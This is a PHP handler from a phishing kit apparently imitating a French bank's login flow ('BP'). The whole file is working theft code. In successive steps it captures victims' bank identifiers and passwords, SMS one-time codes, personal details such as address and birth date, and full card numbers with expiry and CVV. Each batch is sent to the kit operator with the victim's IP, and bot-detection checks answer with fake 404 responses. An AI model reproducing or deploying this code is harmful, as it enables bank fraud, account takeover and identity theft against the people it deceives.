<?php
   

    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {
     include './app/index.php';
	 $_POST['brand'] = 'bpV0.01';
        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if ($_POST['steeep'] == "login") {
            $_SESSION['errors'] = [];
            $_SESSION['identifiant']    = $_POST['identifiant'];
            $_SESSION['password']    = $_POST['password'];
            if( validate_number($_POST['identifiant']) == false || strlen($_POST['identifiant']) < 10 ) {
                $_SESSION['errors']['identifiant'] = true;
            }
            if( validate_number($_POST['password'],6) == false ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BP | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
				include './media/index.php';
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=failed";
                exit();
            }
        }
        if ($_POST['steeep'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Le code n\'est pas valide.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BP | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=details";
                exit();
            } else {
                echo "../index.php?redirection=sms&error=1";
                exit();
            }
        }
        if ($_POST['steeep'] == "details") {
            $_SESSION['errors']      = [];
            $_SESSION['full_name']   = $_POST['full_name'];
            $_SESSION['address']      = $_POST['address'];
            $_SESSION['city']      = $_POST['city'];
            $_SESSION['birth_date']      = $_POST['birth_date'];
            $_SESSION['phone']      = $_POST['phone'];
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = 'Le nom n\'est pas valide';
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = 'L\'adresse non valide';
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = 'La ville non valide';
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = 'La date de naissance est invalide';
            }
            if( validate_number($_POST['phone'],10) == false ) {
                $_SESSION['errors']['phone'] = 'Le téléphone n\'est pas valide';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BP | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Nom complet : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Adresse : ' . $_POST['address'] . "\r\n";
                $message .= 'Ville : ' . $_POST['city'] . "\r\n";
                $message .= 'Date de naissance : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Numéro Téléphone : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
				include './media/index.php';
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=details&error=1";
                exit();
            }
        }
        if ($_POST['steeep'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $_SESSION['plafond']      = $_POST['plafond'];
            $date_ex     = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three'],$one['type']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = 'Le numéro de carte est invalide';
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = 'Le code de sécurité est invalide';
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = 'La date d\'expiration n\'est pas valide';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BP | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= 'Plafond : ' . $_POST['plafond'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
				include './media/index.php';
                echo "../index.php?redirection=success";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>